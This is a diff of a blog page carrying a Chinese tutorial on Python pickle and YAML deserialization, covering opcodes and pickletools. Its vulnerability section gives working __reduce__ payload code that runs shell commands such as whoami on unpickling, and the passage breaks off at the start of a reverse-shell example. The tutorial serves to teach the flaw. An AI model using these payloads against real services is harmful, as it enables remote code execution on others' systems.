@@ -1,114 +1,729 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
-
 <head>
-  <head>
   <meta charset="utf-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <meta name="author" content="viggo" />
-  <title>greetdawn&#39;s Blog - The God love people</title>
-  <meta name="keywords" content="Web安全,Linux,Python,Life">
-  <meta name="description" content="Love coding,Love life!">
-  <link rel="shortcut icon" href="/favicon.ico">
   
-<link rel="stylesheet" href="/css/hclonely.css">
-<link rel="stylesheet" href="//fonts.loli.net/css?family=Arimo:400,700,400italic.css">
-<link rel="stylesheet" href="/css/fonts/linecons/css/linecons.min.css">
-<link rel="stylesheet" href="/css/fonts/fontawesome/css/all.min.css">
-<link rel="stylesheet" href="/css/bootstrap.min.css">
-<link rel="stylesheet" href="/css/xenon-core.min.css">
-<link rel="stylesheet" href="/css/xenon-components.min.css">
-<link rel="stylesheet" href="/css/xenon-skins.min.css">
-<link rel="stylesheet" href="/css/nav.min.css">
-
-  
-<script src="/js/jquery-1.11.1.min.js"></script>
-
-  <script>
-    var userDefinedSearchData = {"custom":false,"thisSearch":"https://www.baidu.com/s?wd=","thisSearchIcon":"url(https://www.baidu.com/favicon.ico)","hotStatus":true,"data":[{"name":"百度","img":"url(https://www.baidu.com/favicon.ico)","url":"https://www.baidu.com/s?wd="}]};
-    var expandAll = false;
-  </script>
-  
-<script src="/js/header.js"></script>
-
-  <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
-  <!--[if lt IE 9]>
-        
-<script src="/js/html5shiv.min.js"></script>
-
-        
-<script src="/js/respond.min.js"></script>
-
-    <![endif]-->
-  <!-- / FB Open Graph -->
+  <title>python序列化与反序列化 | greetdawn&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta property="og:type" content="article">
-  <meta property="og:url" content="http://www.greetdawn.top/2021/02/24/web-security/python-code-audit/python-unserialize/index.html">
-  <meta property="og:title" content="greetdawn&#39;s Blog - The God love people">
-  <meta property="og:description" content="Love coding,Love life!">
-  <meta property="og:site_name" content="greetdawn&#39;s Blog - The God love people">
+<meta property="og:title" content="python序列化与反序列化">
+<meta property="og:url" content="http://www.greetdawn.top/2021/02/24/web-security/python-code-audit/python-unserialize/index.html">
+<meta property="og:site_name" content="greetdawn&#39;s Blog">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/akita-5964180_1920.jpg">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/python_unserialize.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210218113123136.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210218132059917.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20200320230631-6204866e-6abc-1.gif">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200320230711-7972c0ea-6abc-1.gif">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210218164929904.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210219092045080.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210219095145179.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210220105856952.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210220165100857.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210222151603695.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210222151706568.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210222151902135.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210222152104854.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210222153543892.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210222153723888.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210222154330095.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210222154718086.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210222161340815.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223093503733.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223093654970.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223094845756.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223100750055.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223111223199.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223111525518.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223111626157.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223112357209.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223112541297.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223163820292.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223165835716.png">
+<meta property="article:published_time" content="2021-02-24T03:22:00.000Z">
+<meta property="article:modified_time" content="2021-02-24T03:27:14.102Z">
+<meta property="article:author" content="丨greetdawn丨">
+<meta property="article:tag" content="Pickle">
+<meta property="article:tag" content="PyYaml">
+<meta property="article:tag" content="反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/akita-5964180_1920.jpg">
   
-  <meta property="og:image" content="/images/webstack_banner_cn.png">
-  
-  <!-- / Twitter Cards -->
-  <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="greetdawn&#39;s Blog - The God love people">
-  <meta name="twitter:description" content="Love coding,Love life!">
-  
-  <meta name="twitter:image" content="/images/webstack_banner_cn.png">
+    <link rel="alternate" href="/atom.xml" title="greetdawn's Blog" type="application/atom+xml">
   
   
-  <!-- 直接添加html内容即可 -->
-<!-- 可设置多行 -->
+    <link rel="shortcut icon" href="/favicon.ico">
   
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="greetdawn's Blog" type="application/atom+xml">
-</head>
+  
+<link rel="stylesheet" href="/css/typing.css">
 
-</head>
+  
+<link rel="stylesheet" href="/css/donate.css">
 
-
-
-
-  <footer class="main-footer sticky footer-type-1">
-  <div class="footer-inner">
-    <!-- Add your copyright text here -->
-    <p>
-      
-      &copy; 2020 - 2022
-      <a href="javascript:void(0);"><strong>丨greetdawn丨</strong></a> | Design by <a href="http://viggoz.com" target="_blank"><strong>Viggo</strong></a> | Power by <a href="https://hexo.io/" target="_blank"><strong>Hexo</strong></a> & <a href="https://github.com/HCLonely/hexo-theme-webstack/" target="_blank"><strong>hexo-theme-webstack</strong></a>
-    </p>
+  
+  
     
-    <div class="go-up">
-      <a href="#" rel="go-top">
-        <i class="fas fa-angle-up"></i>
-      </a>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+  
+    
+      <body>
+    
+  
+      <div id="container" class="container">
+        <article id="post-web-security/python-code-audit/python-unserialize" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <header id="header" class="header">
+  <nav class="mobile-nav">
+    <h1 class="nickname">NickName</h1>
+    <ul class="mobile-nav-menu">
+      <label for="mobile-menu-toggle"><a id="menu-button">&#9776; Menu</a></label>
+      <input type="checkbox" id="mobile-menu-toggle"/>
+      <ul class="mobile-nav-link">
+        
+        <a href="/">Home</a>
+        
+        <a href="/archives">Archives</a>
+        
+        <a href="/about">About</a>
+        
+      </ul>
+    </ul>
+  </nav>
+	
+		<nav id="main-nav" class="main-nav nav-left">
+	
+	
+	  <a class="main-nav-link" href="/">Home</a>
+	
+	  <a class="main-nav-link" href="/archives">Archives</a>
+	
+	  <a class="main-nav-link" href="/about">About</a>
+	
+  </nav>
+</header>
+
+  <hr/>
+  <div class="article-inner">
+    
+
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      python序列化与反序列化
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry typo" itemprop="articleBody">
+      
+        <p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/akita-5964180_1920.jpg" alt="akita-5964180_1920"></p>
+<span id="more"></span>
+
+
+
+<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="序列化与反序列化流程"><a href="#序列化与反序列化流程" class="headerlink" title="序列化与反序列化流程"></a>序列化与反序列化流程</h3><p>Python 的序列化和反序列化是将一个类对象向字节流转化从而进行存储和传输，然后使用的时候再将字节流转化回原始的对象的一个过程。</p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/python_unserialize.png" alt="python_unserialize"></p>
+<h3 id="序列化与反序列化概念"><a href="#序列化与反序列化概念" class="headerlink" title="序列化与反序列化概念"></a>序列化与反序列化概念</h3><p>在程序运行的过程中，所有的变量存储的数据都是加载在内存中，一旦程序结束，数据所占用的内存就被操作系统全部回收。各种类型的数据从内存中变成可存储或传输的过程称之为序列化，序列化之后，就可以把序列化后的内容写入磁盘，或者通过网络传输到别的机器上。反过来，把数据内容从序列化的对象重新读到内存里称之为反序列化。</p>
+<h3 id="序列化的目的"><a href="#序列化的目的" class="headerlink" title="序列化的目的"></a>序列化的目的</h3><ul>
+<li>以某种存储形式使自定义对象持久化；</li>
+<li>将对象可以从一个地方传递到另一个地方；</li>
+<li>使程序更具有维护性。</li>
+</ul>
+<h3 id="python中序列化模块"><a href="#python中序列化模块" class="headerlink" title="python中序列化模块"></a>python中序列化模块</h3><ul>
+<li><p>pickle</p>
+<p>pickle是python中内建的序列化和反序列化模块，且以二进制的方式进行序列化数据存储，pickle序列化的内容只能使用python才能操作，且反序列化依赖代码。</p>
+</li>
+<li><p>json</p>
+<p>json是一种轻量级的数据交换格式，是一种通用的序列化格式，具有更好的可读性和跨平台性。</p>
+</li>
+<li><p>shelve </p>
+<p>模块是 Python3 新出现的方式，特点是操作简单，使用序列化句柄直接操作，非常方便。缺点是目前不太常用。</p>
+</li>
+<li><p>yaml</p>
+<p>YAML是一种直观的能够被电脑识别的的数据序列化格式，容易被人类阅读，并且容易和脚本语言交互，YAML类似于XML，但是语法比XML简单得多，对于转化成数组或可以hash的数据时是很简单有效的。</p>
+</li>
+</ul>
+<h2 id="pickle模块详解"><a href="#pickle模块详解" class="headerlink" title="pickle模块详解"></a>pickle模块详解</h2><h3 id="pickle基础"><a href="#pickle基础" class="headerlink" title="pickle基础"></a>pickle基础</h3><p>pickle是一种独立的序列化栈语言，通过对opcode的更改编写可以执行python代码、覆盖变量等操作。直接编写的opcode灵活性比使用pickle序列化生成的代码更高。</p>
+<p>序列化函数：</p>
+<pre class="language-python" data-language="python"><code class="language-python">pickle<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>文件<span class="token punctuation">)</span> 
+pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>字符串<span class="token punctuation">)</span></code></pre>
+
+<p>反序列化函数：</p>
+<pre class="language-python" data-language="python"><code class="language-python">pickle<span class="token punctuation">.</span>load<span class="token punctuation">(</span>文件<span class="token punctuation">)</span>
+pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>字符串<span class="token punctuation">)</span></code></pre>
+
+
+
+<h3 id="pickle可序列化的对象"><a href="#pickle可序列化的对象" class="headerlink" title="pickle可序列化的对象"></a>pickle可序列化的对象</h3><ul>
+<li><code>None</code> 、 <code>True</code> 和 <code>False</code></li>
+<li>整数、浮点数、复数</li>
+<li>str、byte、bytearray</li>
+<li>只包含可封存对象的集合，包括 tuple、list、set 和 dict</li>
+<li>定义在模块最外层的函数（使用 def 定义，lambda 函数则不可以）</li>
+<li>定义在模块最外层的内置函数</li>
+<li>定义在模块最外层的类</li>
+<li><code>__dict__</code> 属性值或 <code>__getstate__()</code> 函数的返回值可以被序列化的类（详见官方文档的Pickling Class Instances）</li>
+</ul>
+<h3 id="object-reduce-函数"><a href="#object-reduce-函数" class="headerlink" title="object.__reduce__函数"></a><code>object.__reduce__</code>函数</h3><ul>
+<li><p>开发时，可以重写类的<code>__reduce__</code>方法，使之在被实例化时按照重写的方式进行。该函数在调用时返回<code>(callable, ([para1,para2...])[,...])</code>元组，该类在被unpickle时，其中的callable就会被调用生成对象。(其中callable是构造函数)</p>
+</li>
+<li><p>在opcode中，<code>__reduce__</code>的指令是<code>R</code>,它是选择栈上的第一个对象作为函数，第二个对象作为参数（该对象必须为元组），然后调用该函数。其中<code>R</code>真好对应<code>__reduce__</code>函数，该函数返回值作为<code>R</code>的作用对象，当包含该函数的对象被pickle序列化时，得到的字符串也包含了<code>R</code>。</p>
+</li>
+<li><p>demo</p>
+</li>
+</ul>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/local/env python3</span>
+<span class="token comment">#-*— coding:utf-8 -*-</span>
+
+<span class="token keyword">import</span> os
+<span class="token keyword">import</span> pickle
+
+<span class="token keyword">class</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+		<span class="token keyword">return</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+		
+obj <span class="token operator">=</span> Student<span class="token punctuation">(</span><span class="token punctuation">)</span>
+serialize <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>obj<span class="token punctuation">,</span> protocol<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>serialize<span class="token punctuation">)</span></code></pre>
+
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210218113123136.png" alt="image-20210218113123136"></p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/local/env python3</span>
+<span class="token comment">#-*— coding:utf-8 -*-</span>
+
+<span class="token keyword">import</span> os
+<span class="token keyword">import</span> pickle
+
+<span class="token keyword">class</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+		<span class="token keyword">return</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+		
+obj <span class="token operator">=</span> Student<span class="token punctuation">(</span><span class="token punctuation">)</span>
+serialize <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>obj<span class="token punctuation">,</span> protocol<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
+unserialize <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>serialize<span class="token punctuation">)</span></code></pre>
+
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210218132059917.png" alt="image-20210218132059917"></p>
+<h3 id="pickle过程详解"><a href="#pickle过程详解" class="headerlink" title="pickle过程详解"></a>pickle过程详解</h3><ul>
+<li><p>pickle的解析依靠PVM(pickle virtual machine)</p>
+</li>
+<li><p>PVM的构成：1 解析引擎 2 栈 3 内存</p>
+</li>
+<li><p>解析引擎</p>
+<p>从流中读取opcode和参数，并对其进行解释处理。重复这个动作，知道遇到<code>.</code>停止。最终留在栈顶的值将被作为反序列化对象返回。</p>
+</li>
+<li><p>栈</p>
+<p>由python的list实现，被用来的临时存储数据、参数以及对象</p>
+</li>
+<li><p><code>memo</code></p>
+<p>由python的dict实现，将反序列化完成的数据以<code>key-value</code>的形式存储在memo中，以便后来使用。</p>
+</li>
+<li><p>PVM解析str流程</p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20200320230631-6204866e-6abc-1.gif" alt="img"></p>
+</li>
+<li><p>PVM解析 <code>__reduce__()</code> 流程</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200320230711-7972c0ea-6abc-1.gif" alt="img"></p>
+</li>
+</ul>
+<h3 id="opcode版本"><a href="#opcode版本" class="headerlink" title="opcode版本"></a>opcode版本</h3><ul>
+<li>pickle不同的实现版本得到的opcode不相同，但是pickle可以向下兼容，目前一共有六个版本</li>
+</ul>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/local/env python3</span>
+<span class="token comment">#-*— coding:utf-8 -*-</span>
+
+<span class="token keyword">import</span> os
+<span class="token keyword">import</span> pickle
+
+a <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'zhang'</span><span class="token punctuation">,</span> <span class="token string">'age'</span><span class="token punctuation">:</span><span class="token number">19</span><span class="token punctuation">&#125;</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'pickle版本</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">,</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">,</span> protocol<span class="token operator">=</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+
+<ul>
+<li>运行结果</li>
+</ul>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210218164929904.png" alt="image-20210218164929904"></p>
+<ul>
+<li>pickle3版本的opcode详解:</li>
+</ul>
+<pre class="language-none"><code class="language-none">&#123;&#39;name&#39;:&#39;zhang&#39;, &#39;age&#39;:19&#125;
+b&#39;\x80\x03&#125;q\x00(X\x04\x00\x00\x00nameq\x01X\x05\x00\x00\x00zhangq\x02X\x03\x00\x00\x00ageq\x03K\x13u.&#39;
+# \x80：协议头声明 
+# \x03：协议版本
+# \x04\x00\x00\x00: 数据长度4
+# name: 数据
+# q： 存储栈顶的字符串长度: 一个字节(即\x00)
+# \x13u:代表栈顶位置
+# .: 数据结束符</code></pre>
+
+<ul>
+<li>指令集</li>
+</ul>
+<pre class="language-none"><code class="language-none">MARK           &#x3D; b&#39;(&#39;   # push special markobject on stack
+STOP           &#x3D; b&#39;.&#39;   # every pickle ends with STOP
+POP            &#x3D; b&#39;0&#39;   # discard topmost stack item
+POP_MARK       &#x3D; b&#39;1&#39;   # discard stack top through topmost markobject
+DUP            &#x3D; b&#39;2&#39;   # duplicate top stack item
+FLOAT          &#x3D; b&#39;F&#39;   # push float object; decimal string argument
+INT            &#x3D; b&#39;I&#39;   # push integer or bool; decimal string argument
+BININT         &#x3D; b&#39;J&#39;   # push four-byte signed int
+BININT1        &#x3D; b&#39;K&#39;   # push 1-byte unsigned int
+LONG           &#x3D; b&#39;L&#39;   # push long; decimal string argument
+BININT2        &#x3D; b&#39;M&#39;   # push 2-byte unsigned int
+NONE           &#x3D; b&#39;N&#39;   # push None
+PERSID         &#x3D; b&#39;P&#39;   # push persistent object; id is taken from string arg
+BINPERSID      &#x3D; b&#39;Q&#39;   #  &quot;       &quot;         &quot;  ;  &quot;  &quot;   &quot;     &quot;  stack
+REDUCE         &#x3D; b&#39;R&#39;   # apply callable to argtuple, both on stack
+STRING         &#x3D; b&#39;S&#39;   # push string; NL-terminated string argument
+BINSTRING      &#x3D; b&#39;T&#39;   # push string; counted binary string argument
+SHORT_BINSTRING&#x3D; b&#39;U&#39;   #  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes
+UNICODE        &#x3D; b&#39;V&#39;   # push Unicode string; raw-unicode-escaped&#39;d argument
+BINUNICODE     &#x3D; b&#39;X&#39;   #   &quot;     &quot;       &quot;  ; counted UTF-8 string argument
+APPEND         &#x3D; b&#39;a&#39;   # append stack top to list below it
+BUILD          &#x3D; b&#39;b&#39;   # call __setstate__ or __dict__.update()
+GLOBAL         &#x3D; b&#39;c&#39;   # push self.find_class(modname, name); 2 string args
+DICT           &#x3D; b&#39;d&#39;   # build a dict from stack items
+EMPTY_DICT     &#x3D; b&#39;&#125;&#39;   # push empty dict
+APPENDS        &#x3D; b&#39;e&#39;   # extend list on stack by topmost stack slice
+GET            &#x3D; b&#39;g&#39;   # push item from memo on stack; index is string arg
+BINGET         &#x3D; b&#39;h&#39;   #   &quot;    &quot;    &quot;    &quot;   &quot;   &quot;  ;   &quot;    &quot; 1-byte arg
+INST           &#x3D; b&#39;i&#39;   # build &amp; push class instance
+LONG_BINGET    &#x3D; b&#39;j&#39;   # push item from memo on stack; index is 4-byte arg
+LIST           &#x3D; b&#39;l&#39;   # build list from topmost stack items
+EMPTY_LIST     &#x3D; b&#39;]&#39;   # push empty list
+OBJ            &#x3D; b&#39;o&#39;   # build &amp; push class instance
+PUT            &#x3D; b&#39;p&#39;   # store stack top in memo; index is string arg
+BINPUT         &#x3D; b&#39;q&#39;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 1-byte arg
+LONG_BINPUT    &#x3D; b&#39;r&#39;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 4-byte arg
+SETITEM        &#x3D; b&#39;s&#39;   # add key+value pair to dict
+TUPLE          &#x3D; b&#39;t&#39;   # build tuple from topmost stack items
+EMPTY_TUPLE    &#x3D; b&#39;)&#39;   # push empty tuple
+SETITEMS       &#x3D; b&#39;u&#39;   # modify dict by adding topmost key+value pairs
+BINFLOAT       &#x3D; b&#39;G&#39;   # push float; arg is 8-byte float encoding
+
+TRUE           &#x3D; b&#39;I01\n&#39;  # not an opcode; see INT docs in pickletools.py
+FALSE          &#x3D; b&#39;I00\n&#39;  # not an opcode; see INT docs in pickletools.py</code></pre>
+
+
+
+<h3 id="pickletools"><a href="#pickletools" class="headerlink" title="pickletools"></a>pickletools</h3><p>该工具可以方便的把opcode代码转化成肉眼便于阅读的形式。pickletools是python自带的pickle调试器，有三个功能：反汇编一个已经被打包的字符串、优化一个已经被打包的字符串、返回一个迭代器来供程序使用。</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/local/env python3</span>
+<span class="token comment">#-*— coding:utf-8 -*-</span>
+
+<span class="token keyword">import</span> pickletools
+
+data <span class="token operator">=</span> <span class="token string">b"\x80\x03&#125;q\x00(X\x04\x00\x00\x00nameq\x01X\x05\x00\x00\x00zhangq\x02X\x03\x00\x00\x00ageq\x03K\x13u."</span>
+
+pickletools<span class="token punctuation">.</span>dis<span class="token punctuation">(</span>data<span class="token punctuation">)</span></code></pre>
+
+<p>得到原始字符串的反汇编结果：</p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210219092045080.png" alt="image-20210219092045080"></p>
+<p>反汇编功能：解析字符串，告诉你这个字符串做了什么事情，每一行都是一个指令。</p>
+<p>优化功能:</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/local/env python3</span>
+<span class="token comment">#-*— coding:utf-8 -*-</span>
+
+<span class="token keyword">import</span> pickletools
+
+data <span class="token operator">=</span> <span class="token string">b"\x80\x03&#125;q\x00(X\x04\x00\x00\x00nameq\x01X\x05\x00\x00\x00zhangq\x02X\x03\x00\x00\x00ageq\x03K\x13u."</span>
+
+data <span class="token operator">=</span> pickletools<span class="token punctuation">.</span>optimize<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
+
+pickletools<span class="token punctuation">.</span>dis<span class="token punctuation">(</span>data<span class="token punctuation">)</span></code></pre>
+
+<p>运行结果：</p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210219095145179.png" alt="image-20210219095145179"></p>
+<p>通过结果我们可以发现字符串比原来短了很多，而且反汇编结果中，BINPUT指令没有了。这里的“优化”，就是把不必要的put指令给删掉。这里的put意思就是把当前栈的栈顶复制一份，放进存储区。</p>
+<h2 id="pickle反序列化漏洞"><a href="#pickle反序列化漏洞" class="headerlink" title="pickle反序列化漏洞"></a>pickle反序列化漏洞</h2><h3 id="基本描述"><a href="#基本描述" class="headerlink" title="基本描述"></a>基本描述</h3><p>官方给定的pickle反序列化功能是安全的，且官方只是提供这个反序列化功能，其不安全的问题产生，主要由于传入了不安全的序列化内容，导致了不安全问题的产生。</p>
+<h3 id="漏洞产生的场景"><a href="#漏洞产生的场景" class="headerlink" title="漏洞产生的场景"></a>漏洞产生的场景</h3><ul>
+<li><p>web服务器解析认证token、session值时</p>
+<p>很多web都使用redis、mongodb、memcached等来存储session等状态信息。</p>
+</li>
+<li><p>将对象pickle后存储成磁盘文件</p>
+</li>
+<li><p>将对象pickle后在网络中传输</p>
+</li>
+</ul>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>当序列化及反序列化的过程中碰到一无所知的扩展类型（新式类）时，可以通过类中的定义的<code>__reduce__</code>方法来告知如何进行序列化或者反序列化。</p>
+<p>我们可以通过自定义<code>__reduce__</code>方法来让这个类根据我们在<code>__reduce__</code>中指定的方式进行序列化</p>
+<h3 id="pyaload构造"><a href="#pyaload构造" class="headerlink" title="pyaload构造"></a>pyaload构造</h3><ul>
+<li>执行系统命令payload</li>
+</ul>
+<p>dopickle.py</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
+<span class="token comment">#coding: utf-8</span>
+
+<span class="token keyword">import</span> pickle
+<span class="token keyword">import</span> os
+
+<span class="token keyword">class</span> <span class="token class-name">genpoc</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        s <span class="token operator">=</span> <span class="token triple-quoted-string string">"""whoami"""</span>  <span class="token comment">#要执行的命令</span>
+        <span class="token keyword">return</span> os<span class="token punctuation">.</span>system<span class="token punctuation">,</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token punctuation">)</span>        <span class="token comment">#os.system("echo test >poc.txt")</span>
+
+e <span class="token operator">=</span> genpoc<span class="token punctuation">(</span><span class="token punctuation">)</span>
+poc <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>e<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>poc<span class="token punctuation">)</span>
+pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>poc<span class="token punctuation">)</span></code></pre>
+
+<p>输出结果命令执行了</p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210220105856952.png" alt="image-20210220105856952"></p>
+<p>比较重要的几个操作码</p>
+<pre class="language-python" data-language="python"><code class="language-python">c <span class="token punctuation">:</span> 读取本行的内容作为模块名<span class="token punctuation">(</span> module <span class="token punctuation">)</span> <span class="token punctuation">,</span> 读取下一行的内容作为对象名<span class="token punctuation">(</span> <span class="token builtin">object</span> <span class="token punctuation">)</span> <span class="token punctuation">.</span> 然后将 module<span class="token punctuation">.</span><span class="token builtin">object</span> 作为可调用对象压入到栈中
+<span class="token punctuation">(</span> <span class="token punctuation">:</span> 将一个标记对象压入到栈中 <span class="token punctuation">,</span> 用于确定命令执行的位置 <span class="token punctuation">.</span> 该标记常常搭配 t 指令一起使用 <span class="token punctuation">,</span> 以便产生一个元组
+S <span class="token punctuation">:</span> 后面跟字符串 <span class="token punctuation">,</span> PVM会读取引号中的内容 <span class="token punctuation">,</span> 直到遇见换行符 <span class="token punctuation">,</span> 然后将读取到的内容压入到栈中
+t <span class="token punctuation">:</span> 从栈中不断弹出数据 <span class="token punctuation">,</span> 弹射顺序与压栈时相同 <span class="token punctuation">,</span> 直到弹出左括号 <span class="token punctuation">.</span> 此时弹出的内容形成了一个元组 <span class="token punctuation">,</span> 然后 <span class="token punctuation">,</span> 该元组会被压入栈中 <span class="token punctuation">.</span>
+R <span class="token punctuation">:</span> 将之前压入栈中的元组和可调用对象全部弹出 <span class="token punctuation">,</span> 然后将该元组作为可调用参数的对象并执行该对象  <span class="token punctuation">.</span>最后将结果压入到栈中 <span class="token punctuation">.</span>
+<span class="token punctuation">.</span> <span class="token punctuation">:</span> 结束整个 Pickle 反序列化过程 <span class="token punctuation">.</span></code></pre>
+
+<ul>
+<li>反弹shell</li>
+</ul>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
+<span class="token comment">#coding: utf-8</span>
+
+<span class="token keyword">import</span> pickle
+<span class="token keyword">import</span> os
+
